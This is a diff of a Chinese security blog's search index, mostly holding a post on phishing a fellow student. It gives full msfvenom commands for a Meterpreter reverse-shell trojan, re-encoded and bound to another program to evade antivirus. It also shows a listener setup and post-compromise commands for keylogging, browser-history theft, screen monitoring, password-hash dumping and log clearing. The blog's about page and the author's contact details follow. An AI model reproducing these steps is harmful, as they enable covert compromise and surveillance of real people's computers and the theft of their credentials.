-<h1 id="0x04-获得shell之后的操作"><a href="#0x04-获得shell之后的操作" class="headerlink" title="0x04 获得shell之后的操作"></a>0x04 获得shell之后的操作</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter下的命令：</span><br><span class="line">getwd 当前目录</span><br><span class="line">dir 查看所有文件</span><br><span class="line">cat c:\123.txt 查看文件123.txt内容（数据是字符串传递，所以加一个转义字符\）</span><br><span class="line">search -f cmd.exe （搜索名为cmd.exe文件所在目录）</span><br><span class="line">upload /root/桌面/backldoor.exe（要上传的文件） -&gt; c:\（上传到的目录） 上传文件</span><br><span class="line">download c:\123txt /root 下载文件</span><br><span class="line">clearev 清除日志</span><br><span class="line">getuid 当前用户</span><br><span class="line">ps 查看所用进程</span><br><span class="line">kill 杀死某个进程</span><br><span class="line">sysinfo 系统信息</span><br><span class="line"></span><br><span class="line">键盘记录</span><br><span class="line">keyscan_start 开始键盘记录</span><br><span class="line">keyscan_dump 查看结果</span><br><span class="line">keyscan_stop</span><br><span class="line"></span><br><span class="line">获取浏览器记录</span><br><span class="line">run post/windows/gather/forensics/browser_history</span><br><span class="line">打开拷贝到本地的文件</span><br><span class="line">/root/.msf4/local/aiyou_Firefox_wqsz7fg5.default-release_places.sqlite</span><br><span class="line">查看记录SELECT url FROM moz_places</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">屏幕截图</span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line">屏幕监控</span><br><span class="line">run vnc</span><br><span class="line"></span><br><span class="line">获取密文密码</span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line">获取shell，进入cmd</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>学弟：跟人沾边的事你一点都不干</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 网安学习资源 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>内网渗透之钓鱼篇</title>
+      <link href="/post/40a967b4/"/>
+      <url>/post/40a967b4/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm…这个原因就不说了哈哈 懂得都懂</p><p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMGTI.gif"></p><h2 id="渗透内网"><a href="#渗透内网" class="headerlink" title="渗透内网"></a>渗透内网</h2><p>渗透内网指的是在</p><h1 id="0x02-准备环境"><a href="#0x02-准备环境" class="headerlink" title="0x02 准备环境"></a>0x02 准备环境</h1><p>攻击机：kali</p><p>靶机：学弟的Pc</p><h2 id="开始制作木马"><a href="#开始制作木马" class="headerlink" title="开始制作木马"></a>开始制作木马</h2><p>裸奔木马</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -f exe &gt; /root/test.exe</code></p><p>免杀木马</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.9.70 LPORT=3333 -e x86/shikata_ga_nai -x caidao.exe -i 12 -f exe -o /var/www/html/caidao.exe</code></p><table><thead><tr><th>参数</th><th align="center">备注</th></tr></thead><tbody><tr><td>-e</td><td align="center">指定编码方式对攻击载荷进行重新编译</td></tr><tr><td>-x</td><td align="center">指定木马捆绑在哪个可执行程序模版上</td></tr><tr><td>-i</td><td align="center">指定对目标编码的次数，多次编码理论上来讲有助于免杀</td></tr><tr><td>-f</td><td align="center">指定MSF编码器输出的程序格式</td></tr><tr><td>-o</td><td align="center">指定处理完毕后的文件输出路径</td></tr></tbody></table><p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM80A.png"></p><p>把木马放到html下</p><p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMlOH.png"></p><h2 id="运行msf监听模块"><a href="#运行msf监听模块" class="headerlink" title="运行msf监听模块"></a>运行msf监听模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;shell_reverse_tcp</span><br><span class="line">set LHOST 172.18.9.70</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h1 id="0x03-开始攻击"><a href="#0x03-开始攻击" class="headerlink" title="0x03 开始攻击"></a>0x03 开始攻击</h1><p>首先先诱导学弟点开链接并下载执行木马</p><p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atMQ6e.png"></p><p>当学弟执行木马文件后 获得shell</p><p><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/02/atM3md.png"></p><h1 id="0x04-获得shell之后的操作"><a href="#0x04-获得shell之后的操作" class="headerlink" title="0x04 获得shell之后的操作"></a>0x04 获得shell之后的操作</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter下的命令：</span><br><span class="line">getwd 当前目录</span><br><span class="line">dir 查看所有文件</span><br><span class="line">cat c:\123.txt 查看文件123.txt内容（数据是字符串传递，所以加一个转义字符\）</span><br><span class="line">search -f cmd.exe （搜索名为cmd.exe文件所在目录）</span><br><span class="line">upload /root/桌面/backldoor.exe（要上传的文件） -&gt; c:\（上传到的目录） 上传文件</span><br><span class="line">download c:\123txt /root 下载文件</span><br><span class="line">clearev 清除日志</span><br><span class="line">getuid 当前用户</span><br><span class="line">ps 查看所用进程</span><br><span class="line">kill 杀死某个进程</span><br><span class="line">sysinfo 系统信息</span><br><span class="line"></span><br><span class="line">键盘记录</span><br><span class="line">keyscan_start 开始键盘记录</span><br><span class="line">keyscan_dump 查看结果</span><br><span class="line">keyscan_stop</span><br><span class="line"></span><br><span class="line">获取浏览器记录</span><br><span class="line">run post/windows/gather/forensics/browser_history</span><br><span class="line">打开拷贝到本地的文件</span><br><span class="line">/root/.msf4/local/aiyou_Firefox_wqsz7fg5.default-release_places.sqlite</span><br><span class="line">查看记录SELECT url FROM moz_places</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">屏幕截图</span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line">屏幕监控</span><br><span class="line">run vnc</span><br><span class="line"></span><br><span class="line">获取密文密码</span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line">获取shell，进入cmd</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>学弟：跟人沾边的事你一点都不干</p>]]></content>
+      
+      
       <categories>
-        <category>渗透测试</category>
+          
+          <category> 渗透测试 </category>
+          
       </categories>
-      <tags>
-        <tag>内网渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次渗透外网</title>
-    <url>/post/f65a2643/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="步骤思路"><a href="#步骤思路" class="headerlink" title="步骤思路"></a>步骤思路</h2><p>- </p>
-]]></content>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于本博客</title>
+      <link href="/post/4a17b156/"/>
+      <url>/post/4a17b156/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>本博客搭建时间为2020.01.01</h1><p>By xiaochen</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">关于作者</button></li><li class="tab"><button type="button" data-href="#test3-2">关于博客</button></li><li class="tab"><button type="button" data-href="#test3-3">联系作者</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>一个正在上岸的网安萌新</strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>本站用于记录本人成长日记，以及分享一些杂七杂八的知识和学习资源.</strong></p><p><strong>分享网络安全相关的文章以及学习资料</strong></p><p><strong>本站内容同步至<a href="https://hixiaochen.gitee.io/" title="My Gitee">Gitee</a></strong></p><p>其他博客文章<a href="https://blog.csdn.net/oo798" title="My CSDN">CSDN</a> ||<a href="https://www.cnblogs.com/hixiaochen/" title="My Blog garden">博客园</a></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>QQ:488675848.</strong><br><strong>email:<a href="mailto:&#52;&#56;&#56;&#54;&#55;&#x35;&#x38;&#52;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#52;&#56;&#56;&#54;&#55;&#x35;&#x38;&#52;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a></strong></p><button type="button" class="tab-to-top" onclick="scrollToDest($(this).parents('.tabs'),65)"><i class="fas fa-arrow-up"></i></button></div></div></div><hr>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
 </search>
